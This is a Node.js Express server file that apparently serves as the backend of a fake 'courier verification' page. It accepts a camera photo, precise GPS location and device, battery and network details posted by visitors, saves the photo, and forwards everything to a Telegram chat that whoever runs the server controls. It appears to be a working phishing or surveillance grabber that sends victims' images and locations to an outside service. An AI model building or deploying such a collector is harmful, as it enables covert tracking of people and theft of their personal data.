require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

// Initialize app
const app = express();
const PORT = process.env.PORT || 3000;

// Validate environment variables
if (!process.env.TELEGRAM_BOT_TOKEN) {
    console.error('ERROR: TELEGRAM_BOT_TOKEN is not set in .env file');
    process.exit(1);
}

if (!process.env.TELEGRAM_CHAT_ID) {
    console.error('ERROR: TELEGRAM_CHAT_ID is not set in .env file');
    process.exit(1);
}

console.log('Using Bot Token:', process.env.TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
console.log('Using Chat ID:', process.env.TELEGRAM_CHAT_ID);

// Set up telegram bot with better error handling
let bot;
try {
    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
    // Test the bot token with a simple API call
    bot.getMe().then(botInfo => {
        console.log(`Successfully connected to Telegram Bot: @${botInfo.username}`);
    }).catch(error => {
        console.error('ERROR: Could not connect to Telegram Bot API:', error.message);
        console.error('Please check your TELEGRAM_BOT_TOKEN in the .env file');
    });
} catch (error) {
    console.error('ERROR: Failed to initialize Telegram Bot:', error.message);
    console.error('Please check your TELEGRAM_BOT_TOKEN in the .env file');
}

const chatId = process.env.TELEGRAM_CHAT_ID;

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir);
    console.log('Created uploads directory');
}

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/verify', async (req, res) => {
    try {
        const data = req.body;
        console.log('Received verification data');
        
        // Process photo if it exists
        let photoPath = null;
        if (data.photo) {
            try {
                // Remove the prefix from the base64 data
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
                
                // Save the image to a file
                photoPath = path.join(uploadsDir, `photo_${Date.now()}.jpg`);
                fs.writeFileSync(photoPath, base64Data, 'base64');
                
                // Remove the photo data from the log to avoid huge console logs
                data.photo = 'Saved to file: ' + photoPath;
                console.log('Photo saved successfully to:', photoPath);
            } catch (photoError) {
                console.error('Error saving photo:', photoError);
                data.photoError = photoError.message;
            }
        }
        
        // Log the data (excluding large photo data)
        console.log('Verification data:', JSON.stringify(data, null, 2));
        
        // Prepare to send data to Telegram
        if (!bot) {
            throw new Error('Telegram bot is not initialized');
        }
        
        // Send data to telegram
        console.log('Sending message to Telegram...');
        const message = formatTelegramMessage(data);
        
        try {
            const sentMessage = await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
            console.log('Message sent successfully to Telegram:', sentMessage.message_id);
            
            // Send photo if exists
            if (photoPath && fs.existsSync(photoPath)) {
                console.log('Sending photo to Telegram...');
                try {
                    const sentPhoto = await bot.sendPhoto(chatId, photoPath);
                    console.log('Photo sent successfully to Telegram:', sentPhoto.message_id);
                } catch (photoSendError) {
                    console.error('Error sending photo to Telegram:', photoSendError.message);
                }
            }
            
            // Send location if exists
            if (data.location) {
                console.log('Sending location to Telegram...');
                try {
                    const sentLocation = await bot.sendLocation(chatId, data.location.latitude, data.location.longitude);
                    console.log('Location sent successfully to Telegram:', sentLocation.message_id);
                } catch (locationSendError) {
                    console.error('Error sending location to Telegram:', locationSendError.message);
                }
            }
        } catch (telegramError) {
            console.error('Error sending to Telegram:', telegramError);
            throw new Error(`Failed to send to Telegram: ${telegramError.message}`);
        }
        
        res.status(200).json({ success: true, message: 'Verification data received' });
    } catch (error) {
        console.error('Error processing verification:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Format telegram message
function formatTelegramMessage(data) {
    let message = '<b>🔐 New Courier Verification 🔐</b>\n\n';
    
    message += `<b>📅 Timestamp:</b> ${data.timestamp}\n`;
    
    if (data.deviceInfo) {
        message += '\n<b>📱 Device Info:</b>\n';
        message += `Platform: ${data.deviceInfo.platform}\n`;
        message += `Screen: ${data.deviceInfo.screenSize}\n`;
        message += `Language: ${data.deviceInfo.language}\n`;
        message += `Timezone: ${data.deviceInfo.timeZone}\n`;
    }
    
    if (data.battery) {
        message += '\n<b>🔋 Battery:</b>\n';
        message += `Level: ${data.battery.level}\n`;
        message += `Charging: ${data.battery.charging ? 'Yes' : 'No'}\n`;
    }
    
    if (data.network) {
        message += '\n<b>📶 Network:</b>\n';
        message += `Type: ${data.network.type}\n`;
        message += `Speed: ${data.network.downlink}\n`;
    }
    
    if (data.location) {
        message += '\n<b>📍 Location:</b>\n';
        message += `Lat: ${data.location.latitude}\n`;
        message += `Long: ${data.location.longitude}\n`;
        message += `Accuracy: ${data.location.accuracy}\n`;
    }
    
    message += '\n<b>🌐 User Agent:</b>\n';
    message += `${data.userAgent}`;
    
    return message;
}

// Start server on all network interfaces
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Local access: http://localhost:${PORT}`);
    console.log(`Network access: http://192.168.204.195:${PORT}`);
});



